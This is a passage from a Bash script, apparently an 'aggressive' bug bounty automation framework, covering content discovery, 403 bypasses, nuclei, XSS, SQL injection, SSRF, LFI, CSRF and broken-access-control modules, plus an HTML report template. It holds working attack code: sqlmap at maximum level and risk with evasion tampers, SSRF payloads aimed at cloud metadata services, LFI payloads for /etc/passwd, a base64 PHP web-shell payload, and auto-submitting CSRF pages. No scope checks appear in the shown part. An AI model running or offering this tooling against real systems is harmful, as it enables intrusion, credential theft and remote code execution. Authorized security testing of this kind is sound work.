    MAIN_URL="https://$DOMAIN"
    feroxbuster --url "$MAIN_URL" \
                --wordlist "$WL_MEDIUM" \
                --threads 50 \
                --depth 4 \
                --status-codes 200,204,301,302,307,401,403,405 \
                --auto-tune \
                --collect-backups \
                --collect-extensions js,php,asp,aspx,jsp,json,yaml,yml,env,bak,old,txt,xml \
                --output "$out/feroxbuster_main.txt" \
                --quiet 2>/dev/null
    log OK "feroxbuster complete"

    # API endpoint discovery
    log INFO "Running API endpoint discovery with ffuf..."
    ffuf -u "${MAIN_URL}/FUZZ" \
         -w "$WL_API" \
         -t 100 \
         -mc 200,201,204,301,302,401,403,405 \
         -of json -o "$out/ffuf_api.json" -s 2>/dev/null

    # Extract all found paths
    cat "$out/ffuf_"*.json 2>/dev/null | jq -r '.results[]?.url' 2>/dev/null | sort -u > "$ep/ffuf_found.txt"
    grep -oE 'https?://[^ ]+' "$out/feroxbuster_main.txt" 2>/dev/null | sort -u > "$ep/feroxbuster_found.txt"

    # 403 bypass attempts
    log INFO "Attempting 403 bypass techniques..."
    cat "$out/403_targets.txt" 2>/dev/null | while read -r url; do
        path=$(echo "$url" | grep -oP '(?<='"$DOMAIN"').*')
        base=$(echo "$url" | grep -oP 'https?://[^/]+')
        for bypass in \
            "${path}%2e" "/${path}" "//${path}" \
            "${path}/.." "${path}/." \
            "/%2f${path}" "${path}%20" \
            "${path}%09"; do
            code=$(curl -s -o /dev/null -w "%{http_code}" -H "X-Original-URL: $path" "${base}${bypass}" 2>/dev/null)
            [[ "$code" == "200" ]] && echo "BYPASS: ${base}${bypass} → $code" >> "$out/403_bypass.txt"
        done
        # Header bypasses
        for header in "X-Original-URL" "X-Rewrite-URL" "X-Override-URL" "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1"; do
            code=$(curl -s -o /dev/null -w "%{http_code}" -H "$header: $path" "$url" 2>/dev/null)
            [[ "$code" == "200" ]] && echo "HEADER BYPASS: $header on $url → $code" >> "$out/403_bypass.txt"
        done
    done
    [[ -s "$out/403_bypass.txt" ]] && log WARN "403 BYPASSES FOUND! Check $out/403_bypass.txt"

    # Arjun parameter discovery on key endpoints
    log INFO "Running Arjun (parameter discovery) on live endpoints..."
    head -50 "$WORKSPACE/subdomains/status_200.txt" 2>/dev/null | while read -r url; do
        safe=$(echo "$url" | md5sum | cut -d' ' -f1)
        arjun -u "$url" -oJ "$WORKSPACE/params/arjun_${safe}.json" -t 20 -q 2>/dev/null
    done
    cat "$WORKSPACE/params/arjun_"*.json 2>/dev/null | \
        jq -r '.params[]?' 2>/dev/null | sort -u >> "$WORKSPACE/params/all_params.txt"
    sort -u -o "$WORKSPACE/params/all_params.txt" "$WORKSPACE/params/all_params.txt"

    # Compile master endpoint list
    cat "$ep/ffuf_found.txt" "$ep/feroxbuster_found.txt" \
        "$WORKSPACE/js/all_js_endpoints.txt" \
        "$WORKSPACE/urls/katana.txt" 2>/dev/null | sort -u > "$ep/all_endpoints.txt"
    log OK "Total discovered paths/endpoints: $(wc -l < "$ep/all_endpoints.txt")"

    # Interesting paths
    grep -iE "(admin|api|v1|v2|v3|graphql|swagger|actuator|debug|backup|config|secret|key|token|login|auth|dashboard|panel|manage|internal|dev|test|staging|upload|download|export|import|reset|forgot)" \
         "$ep/all_endpoints.txt" 2>/dev/null | sort -u > "$ep/interesting_paths.txt"
    log OK "Interesting paths: $(wc -l < "$ep/interesting_paths.txt")"
}

# ══════════════════════════════════════════════════════════════
# MODULE 06 - NUCLEI VULNERABILITY SCANNING
# ══════════════════════════════════════════════════════════════
module_nuclei() {
    show_progress "Nuclei Vulnerability Scanning"
    section_header "MODULE 06 — NUCLEI AUTOMATED VULNERABILITY SCAN"
    local out="$WORKSPACE/vulns/nuclei"

    log INFO "Updating nuclei templates..."
    nuclei -update-templates -silent 2>/dev/null

    log INFO "Running nuclei — ALL templates on all live targets..."
    nuclei -list "$WORKSPACE/subdomains/live_urls.txt" \
           -t "$HOME/nuclei-templates" \
           -severity critical,high,medium,low,info \
           -tags cve,rce,sqli,xss,lfi,ssrf,idor,auth,misconfig,exposure,token,default-login,panel,backup,debug \
           -c 50 -rate-limit 150 \
           -timeout 10 \
           -retries 2 \
           -follow-redirects \
           -stats \
           -json-export "$out/nuclei_full.json" \
           -o "$out/nuclei_full.txt" 2>/dev/null
    log OK "Nuclei full: $(wc -l < "$out/nuclei_full.txt" 2>/dev/null || echo 0) findings"

    # Critical/High only report
    cat "$out/nuclei_full.json" 2>/dev/null | \
        jq -r 'select(.info.severity == "critical" or .info.severity == "high") | "\(.info.severity | ascii_upcase) [\(.info.name)] \(.host) \(.matched-url // .host)"' \
        2>/dev/null > "$out/nuclei_critical_high.txt"
    log WARN "Critical/High findings: $(wc -l < "$out/nuclei_critical_high.txt" 2>/dev/null || echo 0)"

    # Nuclei specifically on URLs with params (broader attack surface)
    log INFO "Running nuclei on URLs with parameters..."
    nuclei -list "$WORKSPACE/urls/urls_with_params.txt" \
           -t "$HOME/nuclei-templates/dast" \
           -t "$HOME/nuclei-templates/vulnerabilities" \
           -c 30 -rate-limit 100 \
           -json-export "$out/nuclei_params.json" \
           -o "$out/nuclei_params.txt" -silent 2>/dev/null

    # CVE-specific scan
    log INFO "Running CVE-specific nuclei scan..."
    nuclei -list "$WORKSPACE/subdomains/live_urls.txt" \
           -tags cve \
           -c 50 -rate-limit 100 \
           -json-export "$out/nuclei_cves.json" \
           -o "$out/nuclei_cves.txt" -silent 2>/dev/null
    log OK "CVE findings: $(wc -l < "$out/nuclei_cves.txt" 2>/dev/null || echo 0)"

    # Misconfig scan
    log INFO "Running misconfiguration scan..."
    nuclei -list "$WORKSPACE/subdomains/live_urls.txt" \
           -tags misconfig,exposure,panel,default-login,backup \
           -c 50 \
           -o "$out/nuclei_misconfig.txt" -silent 2>/dev/null
}

# ══════════════════════════════════════════════════════════════
# MODULE 07 - XSS SCANNING
# ══════════════════════════════════════════════════════════════
module_xss() {
    [[ "$NO_EXPLOIT" == true ]] && return
    show_progress "XSS Scanning"
    section_header "MODULE 07 — XSS SCANNING (dalfox)"
    local out="$WORKSPACE/vulns/xss"

    # dalfox on URLs with params
    log INFO "Running dalfox on parameter URLs..."
    dalfox file "$WORKSPACE/urls/gf/xss.txt" \
           --silence \
           --skip-bav \
           --no-color \
           --worker 30 \
           --timeout 10 \
           --delay 0 \
           --output "$out/dalfox_results.txt" \
           --format json 2>/dev/null || \
    dalfox file "$WORKSPACE/urls/urls_with_params.txt" \
           --silence \
           --worker 20 \
           --timeout 10 \
           --output "$out/dalfox_results.txt" 2>/dev/null
    log OK "dalfox: $(wc -l < "$out/dalfox_results.txt" 2>/dev/null || echo 0) findings"

    # DOM XSS check via katana + dalfox pipe
    log INFO "Checking for DOM XSS sources in JS..."
    grep -iE "(innerHTML|outerHTML|document\.write|\.html\(|eval\(|setTimeout\(|location\.href|location\.hash)" \
         "$WORKSPACE/js/downloaded/"*.js 2>/dev/null | \
         grep -oP '"[^"]*"' | sort -u > "$out/dom_xss_sinks.txt"
    log OK "DOM XSS sinks found: $(wc -l < "$out/dom_xss_sinks.txt" 2>/dev/null || echo 0)"
}

# ══════════════════════════════════════════════════════════════
# MODULE 08 - SQL INJECTION
# ══════════════════════════════════════════════════════════════
module_sqli() {
    [[ "$NO_EXPLOIT" == true ]] && return
    show_progress "SQL Injection Scanning"
    section_header "MODULE 08 — SQL INJECTION (sqlmap)"
    local out="$WORKSPACE/vulns/sqli"

    log WARN "Running sqlmap level 5 / risk 3 — AGGRESSIVE MODE"

    # sqlmap on gf-identified sqli URLs
    if [[ -s "$WORKSPACE/urls/gf/sqli.txt" ]]; then
        sqlmap -m "$WORKSPACE/urls/gf/sqli.txt" \
               --batch \
               --level=5 \
               --risk=3 \
               --random-agent \
               --dbs \
               --threads=10 \
               --timeout=30 \
               --retries=3 \
               --tamper=space2comment,between,randomcase \
               --forms \
               --crawl=3 \
               --output-dir="$out/sqlmap_output" 2>/dev/null
    fi

    # Also run on all URLs with params
    sqlmap -m "$WORKSPACE/urls/urls_with_params.txt" \
           --batch \
           --level=5 \
           --risk=3 \
           --random-agent \
           --threads=10 \
           --timeout=30 \
           --tamper=space2comment,between,randomcase \
           --smart \
           --output-dir="$out/sqlmap_all" 2>/dev/null

    log OK "sqlmap scan complete. Results in $out/"
    find "$out" -name "*.txt" -size +0c 2>/dev/null | while read -r f; do
        log WARN "SQLi finding: $f"
    done
}

# ══════════════════════════════════════════════════════════════
# MODULE 09 - SSRF SCANNING
# ══════════════════════════════════════════════════════════════
module_ssrf() {
    [[ "$NO_EXPLOIT" == true ]] && return
    show_progress "SSRF Scanning"
    section_header "MODULE 09 — SSRF DETECTION"
    local out="$WORKSPACE/vulns/ssrf"

    CALLBACK="http://ssrf.$(hostname -f 2>/dev/null || echo 'callback').burpcollaborator.net"

    # SSRF payloads
    SSRF_PAYLOADS=(
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/latest/user-data/"
        "http://metadata.google.internal/computeMetadata/v1/"
        "http://100.100.100.200/latest/meta-data/"
        "http://192.168.1.1"
        "http://localhost"
        "http://127.0.0.1"
        "file:///etc/passwd"
        "dict://127.0.0.1:11211/stats"
        "gopher://127.0.0.1:6379/_INFO"
    )

    log INFO "Fuzzing SSRF-prone parameters with payloads..."
    SSRF_PARAMS=(url redirect return_url next dest destination goto continue link src source href image img action callback)

    cat "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | while read -r u; do
        for param in "${SSRF_PARAMS[@]}"; do
            for payload in "${SSRF_PAYLOADS[@]}"; do
                fuzz_url=$(echo "$u" | qsreplace "${param}=${payload}" 2>/dev/null || echo "$u")
                response=$(curl -s --max-time 5 -L "$fuzz_url" 2>/dev/null)
                if echo "$response" | grep -qiE "(root:|ami-|compute|metadata|internal|aws|gcp)"; then
                    echo "POTENTIAL SSRF: $fuzz_url" >> "$out/ssrf_hits.txt"
                    log WARN "SSRF HIT: $fuzz_url"
                fi
            done
        done
    done < "$WORKSPACE/urls/gf/ssrf.txt" 2>/dev/null

    log OK "SSRF scan complete"
}

# ══════════════════════════════════════════════════════════════
# MODULE 10 - LFI SCANNING
# ══════════════════════════════════════════════════════════════
module_lfi() {
    [[ "$NO_EXPLOIT" == true ]] && return
    show_progress "LFI Scanning"
    section_header "MODULE 10 — LOCAL FILE INCLUSION"
    local out="$WORKSPACE/vulns/lfi"

    LFI_PAYLOADS=(
        "../../../../etc/passwd"
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
        "....//....//....//....//etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "/etc/passwd%00"
        "..%252f..%252f..%252fetc%252fpasswd"
        "php://filter/read=convert.base64-encode/resource=index.php"
        "php://filter/convert.base64-encode/resource=../../config.php"
        "/proc/self/environ"
        "/var/log/apache2/access.log"
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
    )

    LFI_PARAMS=(file path page include load template view doc read)

    log INFO "Fuzzing LFI parameters..."
    cat "$WORKSPACE/urls/gf/lfi.txt" "$WORKSPACE/urls/urls_with_params.txt" 2>/dev/null | sort -u | \
    while read -r u; do
        for payload in "${LFI_PAYLOADS[@]}"; do
            test_url=$(echo "$u" | qsreplace "$payload" 2>/dev/null)
            response=$(curl -s --max-time 8 "$test_url" 2>/dev/null)
            if echo "$response" | grep -qE "(root:x:|bin:x:|nobody:x:|daemon:x:)"; then
                echo "LFI CONFIRMED: $test_url" >> "$out/lfi_confirmed.txt"
                log WARN "LFI CONFIRMED: $test_url"
            elif echo "$response" | grep -qiE "(failed to open stream|no such file|include\(\)|require\(\))"; then
                echo "LFI POSSIBLE (error): $test_url" >> "$out/lfi_possible.txt"
            fi
        done
    done

    log OK "LFI scan complete"
}

# ══════════════════════════════════════════════════════════════
# MODULE 11 - CSRF DETECTION
# ══════════════════════════════════════════════════════════════
module_csrf() {
    [[ "$NO_EXPLOIT" == true ]] && return
    show_progress "CSRF Detection"
    section_header "MODULE 11 — CSRF DETECTION"
    local out="$WORKSPACE/vulns/csrf"

    log INFO "Checking forms for CSRF tokens..."
    cat "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null | while read -r url; do
        forms=$(curl -s --max-time 10 "$url" 2>/dev/null | \
                grep -iE '<form[^>]*(method|action)' )
        if echo "$forms" | grep -qi "post"; then
            csrf_token=$(curl -s --max-time 10 "$url" 2>/dev/null | \
                        grep -iE '(csrf|_token|authenticity_token|nonce)' | head -3)
            if [[ -z "$csrf_token" ]]; then
                echo "POSSIBLE CSRF (no token): $url" >> "$out/csrf_findings.txt"
                log WARN "Possible CSRF (no token): $url"
            else
                echo "TOKEN PRESENT: $url — $csrf_token" >> "$out/csrf_with_token.txt"
            fi
        fi
    done

    # Generate CSRF PoC for findings
    if [[ -s "$out/csrf_findings.txt" ]]; then
        log INFO "Generating CSRF PoC HTML files..."
        while read -r line; do
            target_url=$(echo "$line" | awk '{print $NF}')
            safe=$(echo "$target_url" | md5sum | cut -d' ' -f1)
            cat > "$out/csrf_poc_${safe}.html" << CSRF_EOF
<!DOCTYPE html>
<html>
<head><title>CSRF PoC — BUG Framework</title></head>
<body>
<h2>CSRF Proof of Concept</h2>
<p>Target: $target_url</p>
<form id="csrf" action="$target_url" method="POST">
  <!-- Add relevant parameters here -->
  <input type="hidden" name="PARAM" value="VALUE" />
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
CSRF_EOF
        done < "$out/csrf_findings.txt"
    fi
    log OK "CSRF scan complete"
}

# ══════════════════════════════════════════════════════════════
# MODULE 12 - IDOR / AUTH / BAC GUIDE
# ══════════════════════════════════════════════════════════════
module_idor_auth() {
    show_progress "IDOR/Auth/BAC Enumeration"
    section_header "MODULE 12 — IDOR / AUTH / BAC ENUMERATION"
    local out="$WORKSPACE/vulns/idor"

    # Find ID-like parameters
    log INFO "Extracting numeric/ID parameters for IDOR testing..."
    grep -oP '[?&][a-zA-Z0-9_]+=\d+' "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | \
        sort -u > "$out/id_params.txt"
    log OK "ID-like params: $(wc -l < "$out/id_params.txt")"

    # Find auth-related endpoints
    grep -iE "(login|logout|signup|register|forgot|reset|password|change.pass|profile|account|me|user|admin|api/user|api/me|api/account)" \
         "$WORKSPACE/endpoints/all_endpoints.txt" "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | \
         sort -u > "$out/auth_endpoints.txt"
    log OK "Auth endpoints: $(wc -l < "$out/auth_endpoints.txt")"

    # Find admin/privileged endpoints
    grep -iE "(admin|manage|dashboard|panel|superuser|staff|moderator|internal|back-?office|cms)" \
         "$WORKSPACE/endpoints/all_endpoints.txt" "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | \
         sort -u > "$out/privileged_endpoints.txt"
    log OK "Privileged endpoints: $(wc -l < "$out/privileged_endpoints.txt")"

    # BAC - Test admin endpoints without auth
    log INFO "Testing privileged endpoints for BAC (unauthenticated)..."
    while read -r ep; do
        code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$ep" 2>/dev/null)
        [[ "$code" == "200" ]] && echo "BAC CANDIDATE (200 unauthed): $ep" >> "$out/bac_findings.txt"
    done < "$out/privileged_endpoints.txt"
    [[ -s "$out/bac_findings.txt" ]] && log WARN "BAC candidates found!"

    log OK "IDOR/Auth/BAC enumeration complete"
}

# ══════════════════════════════════════════════════════════════
# MODULE 13 - REPORT GENERATION
# ══════════════════════════════════════════════════════════════
module_report() {
    show_progress "Generating Report"
    section_header "MODULE 13 — REPORT GENERATION"

    END_TIME=$(date +%s)
    DURATION=$((END_TIME - START_TIME))
    DURATION_MIN=$((DURATION / 60))

    local rpt="$WORKSPACE/reports"
    local date_str; date_str=$(date '+%Y-%m-%d %H:%M')

    # Count findings
    local n_subdomains; n_subdomains=$(wc -l < "$WORKSPACE/subdomains/all_subdomains.txt" 2>/dev/null || echo 0)
    local n_live; n_live=$(wc -l < "$WORKSPACE/subdomains/live_urls.txt" 2>/dev/null || echo 0)
    local n_urls; n_urls=$(wc -l < "$WORKSPACE/urls/all_urls.txt" 2>/dev/null || echo 0)
    local n_js; n_js=$(wc -l < "$WORKSPACE/js/js_urls.txt" 2>/dev/null || echo 0)
    local n_endpoints; n_endpoints=$(wc -l < "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null || echo 0)
    local n_params; n_params=$(wc -l < "$WORKSPACE/params/all_params.txt" 2>/dev/null || echo 0)
    local n_nuclei; n_nuclei=$(wc -l < "$WORKSPACE/vulns/nuclei/nuclei_full.txt" 2>/dev/null || echo 0)
    local n_critical; n_critical=$(grep -c "critical\|CRITICAL" "$WORKSPACE/vulns/nuclei/nuclei_full.txt" 2>/dev/null || echo 0)
    local n_high; n_high=$(grep -c "\[high\]\|\[HIGH\]" "$WORKSPACE/vulns/nuclei/nuclei_full.txt" 2>/dev/null || echo 0)
    local n_xss; n_xss=$(wc -l < "$WORKSPACE/vulns/xss/dalfox_results.txt" 2>/dev/null || echo 0)
    local n_lfi; n_lfi=$(wc -l < "$WORKSPACE/vulns/lfi/lfi_confirmed.txt" 2>/dev/null || echo 0)
    local n_csrf; n_csrf=$(wc -l < "$WORKSPACE/vulns/csrf/csrf_findings.txt" 2>/dev/null || echo 0)
    local n_ssrf; n_ssrf=$(wc -l < "$WORKSPACE/vulns/ssrf/ssrf_hits.txt" 2>/dev/null || echo 0)
    local n_secrets; n_secrets=$(wc -l < "$WORKSPACE/js/secrets_found.txt" 2>/dev/null || echo 0)
    local n_bypass; n_bypass=$(wc -l < "$WORKSPACE/paths/403_bypass.txt" 2>/dev/null || echo 0)
    local n_bac; n_bac=$(wc -l < "$WORKSPACE/vulns/idor/bac_findings.txt" 2>/dev/null || echo 0)

    # ── HTML REPORT ───────────────────────────────────────────
    cat > "$rpt/report.html" << HTMLEOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BUG Framework Report — $DOMAIN</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@700&family=Inter:wght@300;400;600&display=swap');
  :root {
    --bg: #0a0e1a; --bg2: #0f1626; --bg3: #141d30;
    --border: #1e2d4a; --accent: #00d4ff; --green: #00ff88;
    --red: #ff3366; --yellow: #ffcc00; --orange: #ff6600;
    --text: #c8d8f0; --dim: #5a7a9a;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; font-size: 14px; line-height: 1.6; }
  .header { background: linear-gradient(135deg, #0a0e1a 0%, #0d1a3a 50%, #0a0e1a 100%);
            border-bottom: 2px solid var(--accent); padding: 40px; text-align: center; position: relative; overflow: hidden; }
  .header::before { content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
                    background: radial-gradient(ellipse at center, rgba(0,212,255,0.05) 0%, transparent 70%); }
  .header h1 { font-family: 'Orbitron', monospace; font-size: 2.5em; color: var(--accent);
               text-shadow: 0 0 30px rgba(0,212,255,0.5); letter-spacing: 4px; }
  .header .subtitle { color: var(--dim); font-family: 'Share Tech Mono', monospace; margin-top: 8px; }
  .header .target-badge { display: inline-block; background: rgba(0,212,255,0.1); border: 1px solid var(--accent);
                           color: var(--accent); padding: 6px 20px; border-radius: 4px; margin-top: 15px;
                           font-family: 'Share Tech Mono', monospace; font-size: 1.1em; }
  .container { max-width: 1400px; margin: 0 auto; padding: 30px; }
  .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 15px; margin: 30px 0; }
  .stat-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; padding: 20px;
               text-align: center; transition: all 0.3s; position: relative; overflow: hidden; }
  .stat-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; }
  .stat-card.blue::before { background: var(--accent); }
  .stat-card.green::before { background: var(--green); }
  .stat-card.red::before { background: var(--red); }
  .stat-card.yellow::before { background: var(--yellow); }
  .stat-card.orange::before { background: var(--orange); }
  .stat-card:hover { border-color: var(--accent); transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,212,255,0.15); }
  .stat-num { font-family: 'Orbitron', monospace; font-size: 2em; font-weight: 700; }
  .stat-num.blue { color: var(--accent); }
  .stat-num.green { color: var(--green); }
  .stat-num.red { color: var(--red); }
  .stat-num.yellow { color: var(--yellow); }
  .stat-num.orange { color: var(--orange); }
  .stat-label { color: var(--dim); font-size: 0.8em; text-transform: uppercase; letter-spacing: 1px; margin-top: 5px; }
  .section { background: var(--bg2); border: 1px solid var(--border); border-radius: 8px; margin: 20px 0; overflow: hidden; }
  .section-header { background: var(--bg3); border-bottom: 1px solid var(--border); padding: 15px 20px;
                    display: flex; align-items: center; gap: 10px; }
  .section-header h2 { font-family: 'Orbitron', monospace; font-size: 0.9em; color: var(--accent); letter-spacing: 2px; }
  .section-num { background: var(--accent); color: var(--bg); width: 28px; height: 28px; border-radius: 4px;
                 display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 0.85em; }
  .section-body { padding: 20px; }
  .vuln-item { background: var(--bg3); border-left: 4px solid; border-radius: 4px; padding: 12px 15px;
               margin: 8px 0; font-family: 'Share Tech Mono', monospace; font-size: 0.85em; word-break: break-all; }
  .vuln-item.critical { border-color: var(--red); }
  .vuln-item.high { border-color: var(--orange); }
  .vuln-item.medium { border-color: var(--yellow); }
  .vuln-item.low { border-color: var(--accent); }
  .vuln-item.info { border-color: var(--dim); }
  .badge { display: inline-block; padding: 2px 8px; border-radius: 3px; font-size: 0.75em;
           font-weight: 600; text-transform: uppercase; letter-spacing: 1px; margin-right: 8px; }
  .badge.critical { background: rgba(255,51,102,0.2); color: var(--red); border: 1px solid var(--red); }
  .badge.high { background: rgba(255,102,0,0.2); color: var(--orange); border: 1px solid var(--orange); }
  .badge.medium { background: rgba(255,204,0,0.2); color: var(--yellow); border: 1px solid var(--yellow); }
  .badge.low { background: rgba(0,212,255,0.2); color: var(--accent); border: 1px solid var(--accent); }
  .file-list { list-style: none; }
  .file-list li { padding: 6px 0; border-bottom: 1px solid var(--border); font-family: 'Share Tech Mono', monospace;
                  font-size: 0.85em; display: flex; justify-content: space-between; align-items: center; }
  .file-list li:last-child { border-bottom: none; }
  .file-count { background: rgba(0,212,255,0.1); color: var(--accent); padding: 2px 8px; border-radius: 3px;
                font-size: 0.8em; min-width: 50px; text-align: center; }
  .manual-table { width: 100%; border-collapse: collapse; }
  .manual-table th { background: var(--bg3); color: var(--accent); font-family: 'Orbitron', monospace;
                     font-size: 0.75em; letter-spacing: 1px; padding: 10px 12px; text-align: left;
                     border-bottom: 2px solid var(--border); }
  .manual-table td { padding: 10px 12px; border-bottom: 1px solid var(--border); vertical-align: top; }
  .manual-table tr:hover td { background: rgba(0,212,255,0.03); }
  .manual-table .vuln-type { color: var(--yellow); font-weight: 600; }
  .manual-table .where { font-family: 'Share Tech Mono', monospace; color: var(--dim); font-size: 0.85em; }
  .manual-table .how { color: var(--text); font-size: 0.85em; }
  .manual-table .tool-badge { background: rgba(0,255,136,0.1); color: var(--green); border: 1px solid rgba(0,255,136,0.3);
                               padding: 2px 6px; border-radius: 3px; font-size: 0.75em; font-family: 'Share Tech Mono', monospace; }
  .guide-step { background: var(--bg3); border: 1px solid var(--border); border-radius: 6px;
                padding: 15px 20px; margin: 10px 0; }
  .guide-step h3 { color: var(--accent); font-family: 'Orbitron', monospace; font-size: 0.8em;
                   letter-spacing: 1px; margin-bottom: 8px; }
  .guide-step code { color: var(--green); font-family: 'Share Tech Mono', monospace; background: rgba(0,255,136,0.05);
                     padding: 10px; display: block; border-radius: 4px; margin-top: 8px; white-space: pre-wrap;
                     border-left: 2px solid var(--green); font-size: 0.85em; }
  .path-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px; }
  .path-item { background: var(--bg3); border: 1px solid var(--border); border-radius: 4px; padding: 8px 12px;
               font-family: 'Share Tech Mono', monospace; font-size: 0.8em; color: var(--green);
               word-break: break-all; }
  .footer { text-align: center; padding: 30px; color: var(--dim); font-family: 'Share Tech Mono', monospace;
            font-size: 0.8em; border-top: 1px solid var(--border); margin-top: 40px; }
  .warning-box { background: rgba(255,51,102,0.08); border: 1px solid rgba(255,51,102,0.3);
                 border-radius: 6px; padding: 12px 16px; margin: 10px 0; color: var(--red); font-size: 0.85em; }
  .info-box { background: rgba(0,212,255,0.05); border: 1px solid rgba(0,212,255,0.2);
              border-radius: 6px; padding: 12px 16px; margin: 10px 0; color: var(--accent); font-size: 0.85em; }
  .tab-bar { display: flex; border-bottom: 1px solid var(--border); }
  .tab { padding: 10px 20px; cursor: pointer; font-family: 'Orbitron', monospace; font-size: 0.75em;
         letter-spacing: 1px; color: var(--dim); border-bottom: 2px solid transparent;
         transition: all 0.2s; }
  .tab.active { color: var(--accent); border-bottom-color: var(--accent); }
  .tab-content { display: none; padding: 20px; }
  .tab-content.active { display: block; }
  pre { background: var(--bg3); border: 1px solid var(--border); border-radius: 4px; padding: 15px;
        overflow-x: auto; font-family: 'Share Tech Mono', monospace; font-size: 0.82em; line-height: 1.5; }
  .highlight { color: var(--yellow); }
  .sep { border: none; border-top: 1px solid var(--border); margin: 20px 0; }
</style>
</head>
<body>

<div class="header">
  <h1>🐛 BUG FRAMEWORK</h1>
  <div class="subtitle">Aggressive Bug Bounty Automation Report</div>
  <div class="target-badge">🎯 TARGET: $DOMAIN</div>
  <div class="subtitle" style="margin-top:10px;">Generated: $date_str | Duration: ${DURATION_MIN}m</div>
</div>

<div class="container">

  <!-- STATS OVERVIEW -->
  <div class="stats-grid">
    <div class="stat-card blue"><div class="stat-num blue">$n_subdomains</div><div class="stat-label">Subdomains Found</div></div>
    <div class="stat-card green"><div class="stat-num green">$n_live</div><div class="stat-label">Live Hosts</div></div>
    <div class="stat-card blue"><div class="stat-num blue">$n_urls</div><div class="stat-label">URLs Collected</div></div>
    <div class="stat-card yellow"><div class="stat-num yellow">$n_js</div><div class="stat-label">JS Files</div></div>
    <div class="stat-card blue"><div class="stat-num blue">$n_endpoints</div><div class="stat-label">Endpoints</div></div>
    <div class="stat-card blue"><div class="stat-num blue">$n_params</div><div class="stat-label">Parameters</div></div>
    <div class="stat-card red"><div class="stat-num red">$n_critical</div><div class="stat-label">Critical</div></div>
    <div class="stat-card orange"><div class="stat-num orange">$n_high</div><div class="stat-label">High</div></div>
    <div class="stat-card red"><div class="stat-num red">$n_xss</div><div class="stat-label">XSS Hits</div></div>
    <div class="stat-card red"><div class="stat-num red">$n_lfi</div><div class="stat-label">LFI Confirmed</div></div>
    <div class="stat-card orange"><div class="stat-num orange">$n_ssrf</div><div class="stat-label">SSRF Hits</div></div>
    <div class="stat-card yellow"><div class="stat-num yellow">$n_csrf</div><div class="stat-label">CSRF Findings</div></div>
    <div class="stat-card red"><div class="stat-num red">$n_secrets</div><div class="stat-label">Secrets Found</div></div>
    <div class="stat-card orange"><div class="stat-num orange">$n_bypass</div><div class="stat-label">403 Bypasses</div></div>
    <div class="stat-card yellow"><div class="stat-num yellow">$n_bac</div><div class="stat-label">BAC Candidates</div></div>
  </div>

  <!-- CRITICAL FINDINGS -->
  <div class="section">
    <div class="section-header"><div class="section-num" style="background:var(--red)">!</div><h2>CRITICAL & HIGH FINDINGS</h2></div>
    <div class="section-body">
$(if [[ -s "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt" ]]; then
    while read -r line; do
        severity=$(echo "$line" | grep -oE '^[A-Z]+' | tr '[:upper:]' '[:lower:]')
        echo "      <div class=\"vuln-item $severity\"><span class=\"badge $severity\">$severity</span>$(echo "$line" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
    done < "$WORKSPACE/vulns/nuclei/nuclei_critical_high.txt"
else
    echo "      <div class=\"info-box\">No critical/high nuclei findings — check nuclei_full.txt for all results.</div>"
fi)
$(if [[ -s "$WORKSPACE/vulns/xss/dalfox_results.txt" ]]; then
    echo "      <hr class=\"sep\"><h3 style=\"color:var(--orange);font-family:'Orbitron',monospace;font-size:0.8em;margin-bottom:10px\">XSS CONFIRMED</h3>"
    head -20 "$WORKSPACE/vulns/xss/dalfox_results.txt" | while read -r line; do
        echo "      <div class=\"vuln-item high\"><span class=\"badge high\">XSS</span>$(echo "$line" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
    done
fi)
$(if [[ -s "$WORKSPACE/vulns/lfi/lfi_confirmed.txt" ]]; then
    echo "      <hr class=\"sep\"><h3 style=\"color:var(--red);font-family:'Orbitron',monospace;font-size:0.8em;margin-bottom:10px\">LFI CONFIRMED</h3>"
    while read -r line; do
        echo "      <div class=\"vuln-item critical\"><span class=\"badge critical\">LFI</span>$(echo "$line" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
    done < "$WORKSPACE/vulns/lfi/lfi_confirmed.txt"
fi)
$(if [[ -s "$WORKSPACE/vulns/ssrf/ssrf_hits.txt" ]]; then
    echo "      <hr class=\"sep\"><h3 style=\"color:var(--red);font-family:'Orbitron',monospace;font-size:0.8em;margin-bottom:10px\">SSRF HITS</h3>"
    while read -r line; do
        echo "      <div class=\"vuln-item critical\"><span class=\"badge critical\">SSRF</span>$(echo "$line" | sed 's/&/\&amp;/g;s/</\&lt;/g;s/>/\&gt;/g')</div>"
    done < "$WORKSPACE/vulns/ssrf/ssrf_hits.txt"
fi)
$(if [[ -s "$WORKSPACE/js/secrets_found.txt" ]]; then
